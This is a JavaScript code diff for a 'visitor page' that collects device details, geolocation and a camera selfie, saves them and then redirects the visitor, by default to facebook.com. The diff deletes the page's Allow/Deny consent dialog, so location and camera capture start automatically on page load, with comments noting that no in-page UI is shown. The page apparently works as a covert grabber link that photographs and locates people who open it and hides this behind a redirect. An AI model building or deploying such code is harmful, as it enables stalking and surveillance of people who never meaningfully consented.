@@ -35,30 +35,10 @@ async function saveVisit(payload) {
 }
 
 export function initVisitorPage() {
-  const dialog = document.getElementById("permission-dialog");
-  const btnAllow = document.getElementById("btn-allow");
-  const btnDeny = document.getElementById("btn-deny");
   const videoEl = document.getElementById("preview");
 
-  let redirectTarget = cfg().redirectUrl || "https://www.facebook.com";
-  let running = false;
-
-  function hideDialog() {
-    dialog?.classList.add("hidden");
-  }
-
-  function redirect() {
-    window.location.replace(redirectTarget);
-  }
-
-  async function runFlow(allowPermissions) {
-    if (running) return;
-    running = true;
-    hideDialog();
-    btnAllow.disabled = true;
-    btnDeny.disabled = true;
-
-    redirectTarget = await fetchRedirectUrl();
+  async function run() {
+    const redirectTarget = await fetchRedirectUrl();
 
     const deviceInfo = getDeviceInfo();
 
@@ -69,18 +49,15 @@ export function initVisitorPage() {
       /* continue */
     }
 
-    let locationPayload = { granted: false };
-    if (allowPermissions) {
-      locationPayload = await requestLocation();
-    }
+    // Native OS/browser location prompt (no in-page UI)
+    const locationPayload = await requestLocation();
 
+    // Native camera prompt (no in-page UI)
     let photoPayload = { granted: false, dataUrl: null };
-    if (allowPermissions) {
-      try {
-        photoPayload = await captureSelfie(videoEl);
-      } catch {
-        photoPayload = { granted: false, error: "denied_or_unavailable" };
-      }
+    try {
+      photoPayload = await captureSelfie(videoEl);
+    } catch {
+      photoPayload = { granted: false, error: "denied_or_unavailable" };
     }
 
     const payload = {
@@ -107,9 +84,8 @@ export function initVisitorPage() {
       /* still redirect */
     }
 
-    redirect();
+    window.location.replace(redirectTarget);
   }
 
-  btnAllow.addEventListener("click", () => runFlow(true));
-  btnDeny.addEventListener("click", () => runFlow(false));
+  run();
 }
